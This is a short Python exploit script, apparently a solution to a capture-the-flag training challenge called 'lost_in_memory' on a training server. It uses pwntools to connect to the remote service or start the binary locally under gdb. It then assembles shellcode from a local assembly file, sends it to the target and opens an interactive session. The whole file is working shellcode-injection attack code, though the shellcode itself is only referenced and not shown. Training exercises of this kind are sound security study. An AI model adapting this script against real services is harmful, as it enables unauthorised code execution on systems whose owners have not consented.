from pwn import *
import time
import subprocess
import sys

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 4001)
else:
	r = process("./lost_in_memory")
	gdb.attach(r, """
	# b prctl
	unset env
	c
	""")

input("wait")
time.sleep(0.5)
bin_shellcode = b""
command = "genbin ~/challenges/tools/shellcodes/write.asm"
try:
	bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
	print(f"An exception occurred: {e}")
	exit(-1)
r.send(bin_shellcode)

r.interactive()
